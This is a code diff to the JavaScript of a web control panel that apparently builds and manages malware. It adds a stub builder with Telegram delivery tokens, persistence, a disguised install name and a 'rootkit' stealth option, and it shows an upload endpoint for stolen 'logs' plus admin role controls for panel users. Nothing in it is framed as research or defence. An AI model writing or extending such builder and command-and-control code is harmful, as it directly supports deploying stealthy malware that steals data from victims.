@@ -189,6 +189,11 @@ document.querySelectorAll('.nav-btn').forEach(btn => {
             loadDashboardStats();
         } else if (tabName === 'clients') {
             loadClients();
+        } else if (tabName === 'builder') {
+            const targetUrlInput = document.getElementById('build-target-url');
+            const userKeyInput = document.getElementById('build-user-key');
+            if (targetUrlInput) targetUrlInput.value = window.location.origin + '/api/upload';
+            if (userKeyInput) userKeyInput.value = currentUser?.api_key || 'Loading...';
         } else if (tabName === 'settings') {
             loadSettings();
             loadProfileUI();
@@ -487,24 +492,33 @@ async function loadAdminUsers() {
                 : `<span class="badge badge-secondary">User</span>`;
 
             let actions = '';
-            if (!isSelf && u.role !== 'admin') {
-                if (u.is_banned) {
-                    actions += `<button class="btn btn-sm btn-outline" style="padding: 4px 10px; font-size:12px; margin-right:4px;" onclick="adminBanToggle(${u.id}, 0, '${escapeHtml(u.username)}')">Unfreeze</button>`;
+            if (!isSelf) {
+                if (u.role === 'admin') {
+                    actions += `<button class="btn btn-sm btn-outline" style="padding: 4px 10px; font-size:12px; margin-right:4px;" onclick="adminToggleRole(${u.id}, 'user', '${escapeHtml(u.username)}')">Demote to User</button>`;
                 } else {
-                    actions += `<button class="btn btn-sm btn-danger" style="padding: 4px 10px; font-size:12px; margin-right:4px;" onclick="adminBanPrompt(${u.id}, '${escapeHtml(u.username)}')">Freeze / Ban</button>`;
+                    actions += `<button class="btn btn-sm btn-primary" style="padding: 4px 10px; font-size:12px; margin-right:4px; background: linear-gradient(135deg, var(--primary), var(--accent-purple)); border:none;" onclick="adminToggleRole(${u.id}, 'admin', '${escapeHtml(u.username)}')">Promote to Admin</button>`;
                 }
-                actions += `<button class="btn btn-sm btn-secondary" style="padding: 4px 10px; font-size:12px;" onclick="adminViewUserLogs(${u.id}, '${escapeHtml(u.username)}')">View Logs (${u.log_count})</button>`;
-            } else if (isSelf) {
-                actions = '<span class="text-muted" style="font-size:12px;">You</span>';
+
+                if (u.role !== 'admin') {
+                    if (u.is_banned) {
+                        actions += `<button class="btn btn-sm btn-outline" style="padding: 4px 10px; font-size:12px; margin-right:4px;" onclick="adminBanToggle(${u.id}, 0, '${escapeHtml(u.username)}')">Unfreeze</button>`;
+                    } else {
+                        actions += `<button class="btn btn-sm btn-danger" style="padding: 4px 10px; font-size:12px; margin-right:4px;" onclick="adminBanPrompt(${u.id}, '${escapeHtml(u.username)}')">Freeze / Ban</button>`;
+                    }
+                }
+                actions += `<button class="btn btn-sm btn-secondary" style="padding: 4px 10px; font-size:12px;" onclick="adminViewUserLogs(${u.id}, '${escapeHtml(u.username)}')">Logs (${u.log_count})</button>`;
             } else {
-                actions = '<span class="text-muted" style="font-size:12px;">Super Admin</span>';
+                actions = '<span class="badge badge-primary" style="font-size:11px;">Current Admin (You)</span>';
             }
+
+            const apiKeyDisplay = u.api_key ? `<code style="font-size:11px; background:rgba(255,255,255,0.06); padding:2px 6px; border-radius:4px; font-family:var(--font-mono); color:var(--primary);">${escapeHtml(u.api_key)}</code>` : '<span class="text-muted" style="font-size:11px;">None</span>';
 
             return `
                 <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
                     <td style="padding:10px;">#${u.id}</td>
                     <td style="padding:10px;"><strong>${escapeHtml(u.username)}</strong></td>
                     <td style="padding:10px;">${roleBadge}</td>
+                    <td style="padding:10px;">${apiKeyDisplay}</td>
                     <td style="padding:10px;">${u.log_count} logs</td>
                     <td style="padding:10px;">${statusBadge}</td>
                     <td style="padding:10px; font-size:12px; color:rgba(255,255,255,0.6);">${formatDate(u.created_at)}</td>
@@ -515,6 +529,34 @@ async function loadAdminUsers() {
     } catch (err) {
         container.innerHTML = `<tr><td colspan="7" class="empty-state py-4 text-center text-danger">Error: ${escapeHtml(err.message)}</td></tr>`;
     }
+}
+
+async function adminToggleRole(userId, newRole, username) {
+    showDialog({
+        title: newRole === 'admin' ? 'Promote to Admin' : 'Demote to User',
+        message: `Are you sure you want to change <strong>${username}</strong>'s role to <strong>${newRole.toUpperCase()}</strong>?`,
+        type: newRole === 'admin' ? 'warning' : 'danger',
+        confirmText: newRole === 'admin' ? 'Promote to Admin' : 'Demote to User',
+        onConfirm: async () => {
+            try {
+                const res = await fetch(`/api/admin/users/${userId}/role`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ role: newRole })
+                });
+                const data = await res.json();
+                if (!res.ok) throw new Error(data.error);
+                showToast(
+                    newRole === 'admin' ? 'User Promoted' : 'User Demoted',
+                    `User ${username} is now ${newRole === 'admin' ? 'an Administrator' : 'a regular User'}`
+                );
+                loadAdminUsers();
+                loadAuditLogs();
+            } catch (err) {
+                showAlert('Role Change Failed', err.message);
+            }
+        }
+    });
 }
 
 function adminBanPrompt(userId, username) {
@@ -1389,6 +1431,8 @@ document.getElementById('btn-build-stub').addEventListener('click', async () => 
 
     const installFolder = document.getElementById('build-install-folder').value;
     const installName   = document.getElementById('build-install-name').value.trim() || 'WindowsHostManager.exe';
+    const debugMode     = false;
+    const rootkitMode   = false;
 
     // Validation
     if (delivery === 'TELEGRAM') {
@@ -1406,13 +1450,15 @@ document.getElementById('btn-build-stub').addEventListener('click', async () => 
     log(`Delivery target selected: ${delivery}`, 'warning');
     log(`Persistence: ${persistence}`, 'info');
     log(`Install location: ${installFolder}\\${installName}`, 'info');
+    if (debugMode) log('Debug Mode ENABLED: Visible console window & full logging active', 'warning');
+    if (rootkitMode) log('Process Stealth (Rootkit) ENABLED: DACL lockdown active', 'warning');
     log('Contacting Python builder engine API...', 'info');
 
     try {
         const res = await fetch('/api/build', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ delivery, botToken, chatId, panelUrl, secretKey, persistence, installFolder, installName })
+            body: JSON.stringify({ delivery, botToken, chatId, panelUrl, secretKey, persistence, installFolder, installName, debugMode, rootkitMode })
         });
 
         const data = await res.json();
